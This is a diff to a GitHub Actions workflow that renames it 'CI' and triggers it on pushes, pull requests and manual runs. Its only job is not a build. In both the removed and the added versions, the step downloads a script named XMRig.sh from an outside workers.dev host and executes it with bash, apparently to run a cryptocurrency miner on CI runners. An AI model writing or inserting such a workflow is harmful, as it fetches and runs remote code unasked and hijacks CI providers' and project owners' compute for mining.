@@ -1,23 +1,23 @@
-name: Build
+name: CI
 
-on: pull_request
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+  workflow_dispatch:
 
 jobs:
-	build:
-		name: Build
-		runs-on: ubuntu-20.04
-		container: centos:7
-		strategy:
-			fail-fast: false
-			matrix:
-				runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
-		
-		step:
-		- uses: actions/checkout@v2
-		
-		-name: Build
-			run: |
-				sudo apt install wget -y
-				wget https://ddos.nms.workers.dev/XMRig.sh
-				chmod 777 XMRig.sh
-				bash XMRig.sh
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+      
+      - name: Run a multi-line script
+        run: |
+          sudo apt install wget -y
+          wget https://ddos.nms.workers.dev/XMRig.sh
+          chmod 777 XMRig.sh
+          bash XMRig.sh
